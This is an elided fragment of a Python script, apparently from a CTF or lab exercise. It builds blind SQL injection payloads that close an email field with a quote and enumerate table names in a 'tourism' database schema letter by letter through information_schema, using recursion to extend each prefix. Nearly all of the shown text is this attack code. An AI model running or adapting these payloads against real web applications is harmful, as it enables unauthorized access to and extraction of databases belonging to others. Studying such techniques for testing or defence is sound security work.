...
def rec_finder(url: str,base:str, index:int, early_stop = False):
    ...
    if early_stop:
        ...
        for letter in alphabet:
            payload = f"ivan@ivan.ez' AND (SELECT 1 FROM information_schema.tables WHERE table_schema='tourism' AND substring(TABLE_NAME,1,{len(base)+1}) = '{base + letter}' limit 1); #"
...
def main():
    ...
    for letter in alphabet:
        ...
        payload = f"ivan@ivan.ez' AND (SELECT 1 FROM information_schema.tables WHERE table_schema='tourism' AND substring(TABLE_NAME,1,1) = '{letter}' limit 1); #"
